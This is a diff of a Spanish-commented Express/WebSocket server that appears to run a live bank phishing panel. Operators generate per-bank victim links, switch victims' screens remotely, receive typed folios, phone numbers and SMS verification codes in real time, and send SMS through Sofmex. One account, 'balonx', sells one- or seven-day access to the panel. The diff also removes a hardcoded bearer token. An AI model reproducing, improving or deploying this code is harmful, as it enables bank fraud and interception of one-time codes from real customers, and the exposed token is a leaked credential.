@@ -13,13 +13,13 @@ const adminClients = new Set<WebSocket>();
 export async function registerRoutes(app: Express): Promise<Server> {
   // Setup authentication
   setupAuth(app);
-  
+
   // Create HTTP server
   const httpServer = createServer(app);
 
   // Create WebSocket server
   const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
-  
+
   // Configurar limpieza periódica de sesiones antiguas
   setInterval(async () => {
     try {
@@ -35,7 +35,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.error('Error en limpieza automática de sesiones:', error);
     }
   }, 12 * 60 * 60 * 1000); // Ejecutar cada 12 horas
-  
+
   // Configurar limpieza periódica de usuarios expirados
   setInterval(async () => {
     try {
@@ -71,23 +71,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (!user) {
         return res.status(401).json({ success: false, message: "Credenciales inválidas" });
       }
-      
+
       // Actualizamos la última fecha de inicio de sesión
       await storage.updateUserLastLogin(user.id);
-      
+
       // Establecemos una cookie de sesión simple (en una implementación real usaríamos JWT o similar)
       res.cookie('auth_token', username, { 
         httpOnly: true,
         secure: process.env.NODE_ENV === 'production',
         maxAge: 24 * 60 * 60 * 1000 // 1 día
       });
-      
+
       res.json({ success: true, user: { ...user, password: undefined } });
     } catch (error: any) {
       res.status(500).json({ success: false, message: error.message });
     }
   });
-  
+
   app.post('/api/admin/logout', async (req, res) => {
     try {
       // Limpiar la cookie de autenticación
@@ -119,36 +119,36 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ success: false, message: error.message });
     }
   });
-  
+
   // Ruta para obtener usuarios regulares (solo para el usuario "balonx")
   app.get('/api/users/regular', async (req, res) => {
     console.log('[API] Solicitud para obtener usuarios regulares');
-    
+
     if (!req.isAuthenticated()) {
       console.log('[API] Error: Usuario no autenticado');
       return res.status(401).json({ message: "No autenticado" });
     }
-    
+
     const user = req.user;
     console.log(`[API] Usuario actual: ${user.username}, rol: ${user.role}`);
-    
+
     // Solo permitir al usuario "balonx" acceder a esta ruta
     if (user.username !== "balonx") {
       console.log('[API] Error: Usuario no autorizado (no es balonx)');
       return res.status(403).json({ message: "No autorizado" });
     }
-    
+
     try {
       console.log('[API] Obteniendo lista de usuarios regulares');
       const users = await storage.getAllUsers();
       const regularUsers = users.filter(user => user.role === UserRole.USER);
       console.log(`[API] Encontrados ${regularUsers.length} usuarios regulares`);
-      
+
       // Mostrar detalles de usuarios para depuración
       regularUsers.forEach(user => {
         console.log(`[API] Usuario: ${user.username}, Activo: ${user.isActive}, Expira: ${user.expiresAt || 'No establecido'}`);
       });
-      
+
       const usersList = regularUsers.map((user: User) => ({ 
         id: user.id,
         username: user.username,
@@ -160,49 +160,49 @@ export async function registerRoutes(app: Express): Promise<Server> {
         createdAt: user.createdAt,
         lastLogin: user.lastLogin
       }));
-      
+
       res.json(usersList);
     } catch (error: any) {
       console.log(`[API] Error al obtener usuarios: ${error.message}`);
       res.status(500).json({ message: error.message });
     }
   });
-  
+
   // Alternar el estado de un usuario (activar/desactivar) (solo para el usuario "balonx")
   app.post('/api/users/regular/:username/toggle-status', async (req, res) => {
     console.log('[API] Solicitud para alternar estado de usuario');
-    
+
     if (!req.isAuthenticated()) {
       console.log('[API] Error: Usuario no autenticado');
       return res.status(401).json({ message: "No autenticado" });
     }
-    
+
     const currentUser = req.user;
     console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);
-    
+
     // Solo permitir al usuario "balonx" acceder a esta ruta
     if (currentUser.username !== "balonx") {
       console.log('[API] Error: Usuario no autorizado (no es balonx)');
       return res.status(403).json({ message: "No autorizado" });
     }
-    
+
     try {
       const { username } = req.params;
       console.log(`[API] Intentando alternar estado del usuario: ${username}`);
-      
+
       const success = await storage.toggleUserStatus(username);
       if (!success) {
         return res.status(404).json({ message: "Usuario no encontrado" });
       }
-      
+
       // Obtener el usuario actualizado
       const updatedUser = await storage.getUserByUsername(username);
       if (!updatedUser) {
         return res.status(404).json({ message: "Usuario no encontrado después de actualización" });
       }
-      
+
       console.log(`[API] Estado de usuario alternado: ${username}, nuevo estado: ${updatedUser.isActive ? 'activo' : 'inactivo'}`);
-      
+
       res.json({ 
         success: true, 
         user: {
@@ -226,29 +226,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Activar un usuario por 1 día (solo para el usuario "balonx")
   app.post('/api/users/regular/:username/activate-one-day', async (req, res) => {
     console.log('[API] Solicitud para activar usuario por 1 día');
-    
+
     if (!req.isAuthenticated()) {
       console.log('[API] Error: Usuario no autenticado');
       return res.status(401).json({ message: "No autenticado" });
     }
-    
+
     const currentUser = req.user;
     console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);
-    
+
     // Solo permitir al usuario "balonx" acceder a esta ruta
     if (currentUser.username !== "balonx") {
       console.log('[API] Error: Usuario no autorizado (no es balonx)');
       return res.status(403).json({ message: "No autorizado" });
     }
-    
+
     try {
       const { username } = req.params;
       console.log(`[API] Intentando activar usuario: ${username}`);
-      
+
       const user = await storage.activateUserForOneDay(username);
       console.log(`[API] Usuario activado con éxito: ${username}`);
       console.log(`[API] Estado actual: activo=${user.isActive}, expira=${user.expiresAt}`);
-      
+
       res.json({ 
         success: true, 
         user: {
@@ -266,33 +266,33 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ message: error.message });
     }
   });
-  
+
   // Activar un usuario por 7 días (solo para el usuario "balonx")
   app.post('/api/users/regular/:username/activate-seven-days', async (req, res) => {
     console.log('[API] Solicitud para activar usuario por 7 días');
-    
+
     if (!req.isAuthenticated()) {
       console.log('[API] Error: Usuario no autenticado');
       return res.status(401).json({ message: "No autenticado" });
     }
-    
+
     const currentUser = req.user;
     console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);
-    
+
     // Solo permitir al usuario "balonx" acceder a esta ruta
     if (currentUser.username !== "balonx") {
       console.log('[API] Error: Usuario no autorizado (no es balonx)');
       return res.status(403).json({ message: "No autorizado" });
     }
-    
+
     try {
       const { username } = req.params;
       console.log(`[API] Intentando activar usuario: ${username}`);
-      
+
       const user = await storage.activateUserForSevenDays(username);
       console.log(`[API] Usuario activado con éxito: ${username}`);
       console.log(`[API] Estado actual: activo=${user.isActive}, expira=${user.expiresAt}`);
-      
+
       res.json({ 
         success: true, 
         user: {
@@ -310,19 +310,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ message: error.message });
     }
   });
-  
+
   // Desactivar usuarios expirados (se puede llamar manualmente o mediante un cron job)
   app.post('/api/users/cleanup-expired', async (req, res) => {
     if (!req.isAuthenticated()) {
       return res.status(401).json({ message: "No autenticado" });
     }
-    
+
     const currentUser = req.user;
     // Solo permitir al usuario "balonx" acceder a esta ruta
     if (currentUser.username !== "balonx") {
       return res.status(403).json({ message: "No autorizado" });
     }
-    
+
     try {
       const deactivatedCount = await storage.cleanupExpiredUsers();
       res.json({ success: true, deactivatedCount });
@@ -330,42 +330,42 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ message: error.message });
     }
   });
-  
+
   // Eliminar un usuario (solo usuario "balonx" puede hacerlo)
   app.delete('/api/users/regular/:username', async (req, res) => {
     console.log('[API] Solicitud para eliminar usuario');
-    
+
     if (!req.isAuthenticated()) {
       console.log('[API] Error: Usuario no autenticado');
       return res.status(401).json({ message: "No autenticado" });
     }
-    
+
     const currentUser = req.user;
     console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);
-    
+
     // Solo permitir al usuario "balonx" acceder a esta ruta
     if (currentUser.username !== "balonx") {
       console.log('[API] Error: Usuario no autorizado (no es balonx)');
       return res.status(403).json({ message: "No autorizado" });
     }
-    
+
     const { username } = req.params;
-    
+
     // No permitir eliminar al usuario admin "balonx"
     if (username === "balonx") {
       console.log('[API] Error: No se puede eliminar al usuario admin "balonx"');
       return res.status(403).json({ message: "No se puede eliminar al usuario administrador principal" });
     }
-    
+
     try {
       console.log(`[API] Intentando eliminar usuario: ${username}`);
       const deleted = await storage.deleteUser(username);
-      
+
       if (!deleted) {
         console.log(`[API] Error: Usuario ${username} no encontrado`);
         return res.status(404).json({ success: false, message: "Usuario no encontrado" });
       }
-      
+
       console.log(`[API] Usuario eliminado con éxito: ${username}`);
       res.json({ success: true, message: `Usuario ${username} eliminado correctamente` });
     } catch (error: any) {
@@ -373,7 +373,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ success: false, message: error.message });
     }
   });
-  
+
   app.get('/api/admin/user', async (req, res) => {
     try {
       // Obtener el username de la cookie de autenticación
@@ -381,18 +381,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (!username) {
         return res.status(401).json({ message: "No autorizado" });
       }
-      
+
       // Buscar el usuario por nombre de usuario
       const user = await storage.getUserByUsername(username);
       if (!user) {
         return res.status(401).json({ message: "Usuario no encontrado" });
       }
-      
+
       // Verificar si el usuario está activo
       if (!user.isActive) {
         return res.status(403).json({ message: "Usuario inactivo" });
       }
-      
+
       // Devolver el usuario sin la contraseña
       res.json({ ...user, password: undefined });
     } catch (error: any) {
@@ -403,7 +403,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get('/api/sessions', async (req, res) => {
     try {
       const { type = 'current' } = req.query;
-      
+
       let sessions;
       if (type === 'saved') {
         sessions = await storage.getSavedSessions();
@@ -412,7 +412,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       } else {
         sessions = await storage.getCurrentSessions();
       }
-      
+
       res.json(sessions);
     } catch (error) {
       console.error("Error fetching sessions:", error);
@@ -441,52 +441,52 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const { id } = req.params;
       const session = await storage.updateSession(id, req.body);
-      
+
       // Notify all admin clients
       broadcastToAdmins(JSON.stringify({
         type: 'SESSION_UPDATE',
         data: session
       }));
-      
+
       res.json(session);
     } catch (error) {
       console.error("Error updating session:", error);
       res.status(500).json({ message: "Error updating session" });
     }
   });
-  
+
   // Endpoint para guardar una sesión
   app.post('/api/sessions/:id/save', async (req, res) => {
     try {
       const { id } = req.params;
       const session = await storage.saveSession(id);
-      
+
       // Notify all admin clients
       broadcastToAdmins(JSON.stringify({
         type: 'SESSION_UPDATE',
         data: session
       }));
-      
+
       res.json(session);
     } catch (error) {
       console.error("Error saving session:", error);
       res.status(500).json({ message: "Error saving session" });
     }
   });
-  
+
   // Endpoint para eliminar una sesión
   app.delete('/api/sessions/:id', async (req, res) => {
     try {
       const { id } = req.params;
       const success = await storage.deleteSession(id);
-      
+
       if (success) {
         // Notify all admin clients
         broadcastToAdmins(JSON.stringify({
           type: 'SESSION_DELETE',
           data: { sessionId: id }
         }));
-        
+
         res.json({ success: true });
       } else {
         res.status(404).json({ success: false, message: "Session not found" });
@@ -496,18 +496,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ message: "Error deleting session" });
     }
   });
-  
+
   // Endpoint para limpiar sesiones expiradas (más de 5 días)
   app.post('/api/cleanup-sessions', async (req, res) => {
     try {
       const deletedCount = await storage.cleanupExpiredSessions();
-      
+
       // Notify all admin clients to refresh their session list
       broadcastToAdmins(JSON.stringify({
         type: 'SESSIONS_CLEANUP',
         data: { deletedCount }
       }));
-      
+
       res.json({ success: true, deletedCount });
     } catch (error) {
       console.error("Error cleaning up sessions:", error);
@@ -519,7 +519,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const { banco = "LIVERPOOL" } = req.query;
       const sessionId = nanoid(10);
-      
+
       // Generamos un código de 6 dígitos numéricos fácil de ver para el folio
       const generateSixDigitCode = () => {
         // Genera números aleatorios entre 0-9 para cada posición
@@ -529,9 +529,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
         return code;
       };
-      
+
       const sixDigitCode = generateSixDigitCode();
-      
+
       const session = await storage.createSession({ 
         sessionId, 
         banco: banco as string,
@@ -542,17 +542,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Obtenemos el dominio base desde las variables de entorno
       const { REPLIT_DOMAINS } = process.env;
       const domain = REPLIT_DOMAINS ? REPLIT_DOMAINS.split(',')[0] : 'localhost:5000';
-      
+
       // En lugar de intentar usar subdominios, usaremos rutas diferentes
       // La ruta del cliente tendrá un prefijo especial que la hace diferente 
       // del panel de administración
-      
+
       // Armamos el enlace final - usando la misma URL base pero con una ruta específica
       const link = `https://${domain}/client/${sessionId}`;
-      
+
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
       console.log(`URL del cliente: ${link}`);
-      
+
       res.json({ 
         sessionId, 
         link, 
@@ -567,25 +567,25 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // WebSocket handling
   wss.on('connection', (ws, req) => {
     console.log('New WebSocket connection');
-    
+
     // Handle client/admin identification
     ws.on('message', async (message) => {
       try {
         const data = JSON.parse(message.toString());
-        
+
         // Register client or admin
         if (data.type === 'REGISTER') {
           if (data.role === 'ADMIN') {
             adminClients.add(ws);
             console.log('Admin client registered');
-            
+
             // Send sessions to the admin - current sessions by default
             const sessions = await storage.getCurrentSessions();
             ws.send(JSON.stringify({
               type: 'INIT_SESSIONS',
               data: sessions
             }));
-            
+
             // Run cleanup of old sessions (more than 5 days)
             try {
               const deletedCount = await storage.cleanupExpiredSessions();
@@ -603,7 +603,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           else if (data.role === 'CLIENT' && data.sessionId) {
             clients.set(data.sessionId, ws);
             console.log(`Client registered with session ID: ${data.sessionId}`);
-            
+
             // Get session info and send to client
             const session = await storage.getSessionById(data.sessionId);
             if (session) {
@@ -615,14 +615,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
           }
           return;
         }
-        
+
         // Handle screen change request from admin
         if (data.type === 'SCREEN_CHANGE') {
           try {
             // Validate the data
             const validatedData = screenChangeSchema.parse(data.data);
             const { sessionId, tipo } = validatedData;
-            
+
             // Find the target client
             const client = clients.get(sessionId);
             if (client && client.readyState === WebSocket.OPEN) {
@@ -631,11 +631,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 type: 'SCREEN_CHANGE',
                 data: validatedData
               }));
-              
+
               // Update session in storage with the new screen state
               // Remove "mostrar_" prefix from tipo if present
               let screenType = tipo.replace('mostrar_', '');
-              
+
               // Normalizar screenType para SMS_COMPRA
               if (screenType.toLowerCase() === 'sms_compra' || 
                   screenType.toLowerCase() === 'smscompra' ||
@@ -643,10 +643,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 console.log('Normalizando screenType SMS_COMPRA en servidor:', screenType, 'to', ScreenType.SMS_COMPRA);
                 screenType = ScreenType.SMS_COMPRA;
               }
-              
+
               await storage.updateSession(sessionId, { pasoActual: screenType });
               console.log('Actualizado pasoActual a:', screenType);
-              
+
               // Notify all admin clients about the update
               const updatedSession = await storage.getSessionById(sessionId);
               broadcastToAdmins(JSON.stringify({
@@ -663,17 +663,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
           }
           return;
         }
-        
+
         // Handle client input data
         if (data.type === 'CLIENT_INPUT') {
           try {
             // Validate the data
             const validatedData = clientInputSchema.parse(data.data);
             const { sessionId, tipo, data: inputData } = validatedData;
-            
+
             // Update the session with the new data
             const updatedFields: Record<string, any> = {};
-            
+
             switch (tipo) {
               case 'folio':
                 updatedFields.folio = inputData.folio;
@@ -700,7 +700,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 if (inputData && inputData.smsCompra) {
                   updatedFields.smsCompra = inputData.smsCompra;
                   console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);
-                  
+
                   // Notificar a los administradores el código de cancelación inmediatamente
                   broadcastToAdmins(JSON.stringify({
                     type: 'SMS_COMPRA_CODE',
@@ -717,9 +717,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.celular = inputData.celular;
                 break;
             }
-            
+
             console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
-            
+
             // Notify admins immediately of incoming data before database update
             broadcastToAdmins(JSON.stringify({
               type: 'CLIENT_INPUT_REALTIME',
@@ -729,11 +729,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 inputData
               }
             }));
-            
+
             // Update session if we have fields to update
             if (Object.keys(updatedFields).length > 0) {
               const updatedSession = await storage.updateSession(sessionId, updatedFields);
-              
+
               // Notify all admin clients about the database update
               broadcastToAdmins(JSON.stringify({
                 type: 'SESSION_UPDATE',
@@ -753,7 +753,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         console.error("Error processing WebSocket message:", error);
       }
     });
-    
+
     // Handle disconnection
     ws.on('close', () => {
       // Remove from admin clients if it was an admin
@@ -761,7 +761,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         adminClients.delete(ws);
         console.log('Admin client disconnected');
       }
-      
+
       // Remove from clients if it was a client
       Array.from(clients.entries()).forEach(([sessionId, client]) => {
         if (client === ws) {
@@ -771,16 +771,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     });
   });
-  
+
   // === API de SMS ===
-  
+
   // Obtener la configuración actual de la API de SMS
   app.get('/api/sms/config', async (req, res) => {
     try {
       if (!req.isAuthenticated()) {
         return res.status(401).json({ message: "No autenticado" });
       }
-      
+
       const config = await storage.getSmsConfig();
       // Si hay una config, ocultamos la api key por seguridad, solo mostramos si está activa
       if (config) {
@@ -788,7 +788,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           isActive: config.isActive,
           updatedAt: config.updatedAt,
           updatedBy: config.updatedBy,
-          hasApiKey: !!config.apiKey,
+          hasApiKey: !!config.sofmexUsername, // Changed to check for Sofmex username
           apiUrl: config.apiUrl || 'https://api.sofmex.mx/api/sms'
         });
       } else {
@@ -804,35 +804,37 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ message: error.message });
     }
   });
-  
+
   // Actualizar la configuración de la API de SMS
   app.post('/api/sms/config', async (req, res) => {
     try {
       if (!req.isAuthenticated()) {
         return res.status(401).json({ message: "No autenticado" });
       }
-      
+
       const user = req.user;
       // Solo usuario administrador puede actualizar la configuración
       if (user.role !== UserRole.ADMIN) {
         return res.status(403).json({ message: "Solo administradores pueden actualizar la configuración de API" });
       }
-      
+
       // Verificamos si es un modo de simulación
       const apiUrl = req.body.apiUrl || 'https://api.sofmex.mx/api/sms';
       const simulationMode = apiUrl && (apiUrl.includes('simulacion') || apiUrl.includes('localhost'));
-      
+
       // En modo simulación, no requerimos API key
-      const apiKey = simulationMode ? 'SIMULATION_MODE' : req.body.apiKey;
-      
+      const sofmexUsername = req.body.sofmexUsername;
+      const sofmexPassword = req.body.sofmexPassword;
+
       const data = insertSmsConfigSchema.parse({
-        apiKey: apiKey,
+        sofmexUsername: sofmexUsername, // Changed to Sofmex username
+        sofmexPassword: sofmexPassword, // Added Sofmex password
         apiUrl: apiUrl,
         updatedBy: user.username
       });
-      
+
       const config = await storage.updateSmsConfig(data);
-      
+
       // Respuesta adicional para el modo simulación
       const response: {
         isActive: boolean | null;
@@ -846,29 +848,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
         isActive: config.isActive,
         updatedAt: config.updatedAt,
         updatedBy: config.updatedBy,
-        hasApiKey: Boolean(config.apiKey),
+        hasApiKey: Boolean(config.sofmexUsername), // Changed to check for Sofmex username
         apiUrl: config.apiUrl,
         success: true
       };
-      
+
       if (simulationMode) {
         console.log("API de SMS configurada en modo simulación:", config.apiUrl);
         response.message = "API configurada en modo simulación. Los mensajes serán enviados solo de manera simulada.";
       }
-      
+
       res.json(response);
     } catch (error: any) {
       res.status(500).json({ message: error.message });
     }
   });
-  
+
   // Obtener los créditos SMS del usuario actual
   app.get('/api/sms/credits', async (req, res) => {
     try {
       if (!req.isAuthenticated()) {
         return res.status(401).json({ message: "No autenticado" });
       }
-      
+
       const user = req.user;
       const credits = await storage.getUserSmsCredits(user.id);
       res.json({ credits });
@@ -876,27 +878,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ message: error.message });
     }
   });
-  
+
   // Agregar créditos a un usuario (solo admin)
   app.post('/api/sms/credits/:userId', async (req, res) => {
     try {
       if (!req.isAuthenticated()) {
         return res.status(401).json({ message: "No autenticado" });
       }
-      
+
       const currentUser = req.user;
       // Solo administradores pueden agregar créditos
       if (currentUser.role !== UserRole.ADMIN) {
         return res.status(403).json({ message: "Solo administradores pueden agregar créditos" });
       }
-      
+
       const userId = parseInt(req.params.userId);
       const { amount } = req.body;
-      
+
       if (!amount || amount <= 0) {
         return res.status(400).json({ message: "La cantidad debe ser un número positivo" });
       }
-      
+
       const smsCredits = await storage.addSmsCredits(userId, amount);
       res.json({
         success: true,
@@ -907,17 +909,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ message: error.message });
     }
   });
-  
+
   // Enviar un SMS
   app.post('/api/sms/send', async (req, res) => {
     try {
       if (!req.isAuthenticated()) {
         return res.status(401).json({ message: "No autenticado" });
       }
-      
+
       const user = req.user;
       const config = await storage.getSmsConfig();
-      
+
       // Verificar si la API está configurada
       if (!config || !config.isActive) {
         return res.status(400).json({ 
@@ -925,18 +927,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
           message: "La API de SMS no está configurada o está inactiva" 
         });
       }
-      
+
       // Verificar si está en modo simulación
       const simulationMode = config.apiUrl && (config.apiUrl.includes('simulacion') || config.apiUrl.includes('localhost'));
-      
-      // En modo real, necesitamos una API key
-      if (!simulationMode && !config.apiKey) {
+
+      // En modo real, necesitamos una API key o credenciales SofMex
+      if (!simulationMode && (!config.sofmexUsername || !config.sofmexPassword)) {
         return res.status(400).json({ 
           success: false, 
-          message: "La API de SMS no tiene una API key configurada" 
+          message: "La API de SMS no tiene credenciales de SofMex configuradas" 
         });
       }
-      
+
       // Verificar si el usuario tiene créditos (solo para usuarios regulares)
       // Los administradores no necesitan créditos para enviar SMS
       if (user.role !== UserRole.ADMIN) {
@@ -948,17 +950,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
           });
         }
       }
-      
+
       // Validar los datos del SMS
       const { phoneNumber, message, sessionId } = req.body;
-      
+
       if (!phoneNumber || !message) {
         return res.status(400).json({ 
           success: false, 
           message: "Se requiere número de teléfono y mensaje" 
         });
       }
-      
+
       // Preparar los datos para el historial
       const smsData = insertSmsHistorySchema.parse({
         userId: user.id,
@@ -966,24 +968,38 @@ export async function registerRoutes(app: Express): Promise<Server> {
         message,
         sessionId: sessionId || null
       });
-      
+
       // Guardar en el historial como pendiente
       const smsRecord = await storage.addSmsToHistory(smsData);
-      
+
       // Implementación real de la API de Sofmex
       try {
-        // Obtener la API key y URL configurada
-        const apiKey = config.apiKey;
-        const apiUrl = config.apiUrl || 'https://api.sofmex.mx/api/sms';
-        
-        // Preparar los datos para la API de Sofmex
-        // Usar la API key proporcionada o la almacenada en la configuración
-        const useApiKey = apiKey || 'eyJhbGciOiJIUzUxMiJ9.eyJhdXRob3JpdGllcyI6Ilt7XCJhdXRob3JpdHlcIjpcIk1FTlNBSkVcIn1dIiwic3ViIjoiam9zZW1vcmVub2ZzMTlAZ21haWwuY29tIiwiaWF0IjoxNzQ0MDc2ODgzLCJleHAiOjQ4OTc2NzY4ODN9.KYpzK4DekH2xSZkZyRe3aL6pFqdqw649lNBK8WD8wioBYfMC_sy-_6-TWFyoxtHtxjb12AmGlcvefdp02sK3OQ';
-        
+        const { sofmexUsername, sofmexPassword } = config;
+        const apiUrl = config.apiUrl || 'https://api.sofmex.mx/auth';
+
+        // Primero autenticamos con SofMex
+        const authResponse = await fetch(apiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            username: sofmexUsername,
+            password: sofmexPassword
+          })
+        });
+
+        if (!authResponse.ok) {
+          throw new Error('Error de autenticación con SofMex: ' + await authResponse.text());
+        }
+
+        const { token } = await authResponse.json();
+
+        const smsApiUrl = config.apiUrl || 'https://api.sofmex.mx/api/sms'; // Separate SMS API endpoint
         const requestData = {
           method: 'POST',
           headers: {
-            'Authorization': `Bearer ${useApiKey}`,
+            'Authorization': `Bearer ${token}`,
             'Content-Type': 'application/json'
           },
           body: JSON.stringify({
@@ -991,15 +1007,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
             message: message
           })
         };
-        
+
         console.log("Enviando SMS a través de la API:", {
-          url: apiUrl,
+          url: smsApiUrl,
           phone: phoneNumber,
           messageLength: message.length
         });
-        
+
         try {
-          console.log("Intentando conectar a:", apiUrl);
+          console.log("Intentando conectar a:", smsApiUrl);
           console.log("Datos de la solicitud:", {
             method: requestData.method,
             headers: {
@@ -1008,14 +1024,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
             },
             datos: JSON.parse(requestData.body as string)
           });
-          
+
           // Verificar si debemos simular el envío (para pruebas)
-          const simulateMode = apiUrl.includes('simulacion') || apiUrl.includes('localhost');
-          
+          const simulateMode = smsApiUrl.includes('simulacion') || smsApiUrl.includes('localhost');
+
           if (simulateMode) {
             console.log("Modo simulación: Simulando envío exitoso");
             await storage.updateSmsStatus(smsRecord.id, 'sent');
-            
+
             return res.json({
               success: true,
               message: "Mensaje enviado correctamente (simulado)",
@@ -1023,39 +1039,39 @@ export async function registerRoutes(app: Express): Promise<Server> {
               simulated: true
             });
           }
-          
+
           // Agregar timeout para evitar bloqueo indefinido
           const controller = new AbortController();
           const timeoutId = setTimeout(() => controller.abort(), 10000);
-          
+
           try {
-            const response = await fetch(apiUrl, {
+            const response = await fetch(smsApiUrl, {
               ...requestData,
               signal: controller.signal
             });
-            
+
             clearTimeout(timeoutId);
-            
+
             const responseText = await response.text();
             let responseData;
-            
+
             try {
               responseData = JSON.parse(responseText);
             } catch (e) {
               responseData = { message: `Respuesta no es JSON válido: ${responseText.substring(0, 100)}` };
             }
-            
+
             console.log("Respuesta recibida:", {
               status: response.status,
               statusText: response.statusText,
               data: responseData
             });
-            
+
             if (response.ok) {
               // Actualizar el registro como enviado
               await storage.updateSmsStatus(smsRecord.id, 'sent');
               console.log("SMS enviado correctamente:", responseData);
-              
+
               res.json({
                 success: true,
                 message: "Mensaje enviado correctamente",
@@ -1067,7 +1083,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               const errorMsg = responseData.message || `Error ${response.status}: ${response.statusText}`;
               await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);
               console.error("Error al enviar SMS:", errorMsg);
-              
+
               res.status(400).json({
                 success: false,
                 message: `Error en la API de SMS: ${errorMsg}`,
@@ -1079,7 +1095,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               const timeoutMsg = 'La solicitud excedió el tiempo de espera (10 segundos)';
               await storage.updateSmsStatus(smsRecord.id, 'failed', timeoutMsg);
               console.error("Timeout en la solicitud a la API de SMS");
-              
+
               res.status(500).json({
                 success: false,
                 message: timeoutMsg,
@@ -1089,13 +1105,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
               throw fetchError; // Propagar otros errores al manejador externo
             }
           }
-          
+
         } catch (error: any) {
           // Error al realizar la solicitud fetch
           const errorMsg = error.message || 'Error de conexión con la API';
           await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);
           console.error("Error de conexión con la API de SMS:", errorMsg);
-          
+
           res.status(500).json({
             success: false,
             message: `Error de conexión con la API de SMS: ${errorMsg}`,
@@ -1114,36 +1130,36 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     }
   });
-  
+
   // Obtener historial de SMS enviados
   app.get('/api/sms/history', async (req, res) => {
     try {
       if (!req.isAuthenticated()) {
         return res.status(401).json({ message: "No autenticado" });
       }
-      
+
       const user = req.user;
       const history = await storage.getUserSmsHistory(user.id);
-      
+
       res.json(history);
     } catch (error: any) {
       res.status(500).json({ message: error.message });
     }
   });
-  
+
   // Obtener todos los usuarios regulares (para agregar créditos)
   app.get('/api/users/regular', async (req, res) => {
     try {
       if (!req.isAuthenticated()) {
         return res.status(401).json({ message: "No autenticado" });
       }
-      
+
       const currentUser = req.user;
       // Solo administradores pueden ver la lista de usuarios
       if (currentUser.role !== UserRole.ADMIN) {
         return res.status(403).json({ message: "Solo administradores pueden ver la lista de usuarios" });
       }
-      
+
       const users = await storage.getAllUsers();
       // Filtrar administradores y enviar solo datos básicos
       const regularUsers = users.filter(user => user.role === UserRole.USER).map(user => ({
@@ -1153,7 +1169,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         expiresAt: user.expiresAt,
         credits: 0 // El frontend tendrá que cargar los créditos aparte
       }));
-      
+
       res.json(regularUsers);
     } catch (error: any) {
       res.status(500).json({ message: error.message });
